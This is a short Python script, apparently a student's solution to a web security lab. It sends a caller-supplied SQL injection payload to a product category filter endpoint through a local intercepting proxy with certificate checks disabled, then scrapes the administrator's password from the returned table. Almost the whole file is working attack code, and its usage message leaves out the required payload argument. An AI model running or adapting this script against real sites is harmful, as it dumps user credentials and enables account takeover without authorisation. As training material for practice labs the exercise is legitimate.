"""
Lab 05, pretty much the same as Rana's but I have added some more command line arguments.
"""

import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_users_table(url):
    username = user
    path = "filter?category=Pets"
    sql_payload = payload
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    res = r.text
    if "administrator" in res:
        print("[+] Found the password")
        soup = BeautifulSoup(r.text, 'html.parser')
        admin_password = soup.body.find(string="administrator").parent.findNext('td').contents[0]
        print("[+] The administrator password is '%s'" % admin_password)
        return True
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        user = sys.argv[2].strip()
        payload = sys.argv[3].strip()
    except IndexError:
        print("[-] Usage: %s <url> <user>" % sys.argv[0])
        print("[-] Example: %s http://www.example.com administrator" % sys.argv[0])
        sys.exit(-1)

    print("[+] Dumping the list of usernames and passwords")
    if not exploit_users_table(url):
        print("[+] Did not find the administrator password")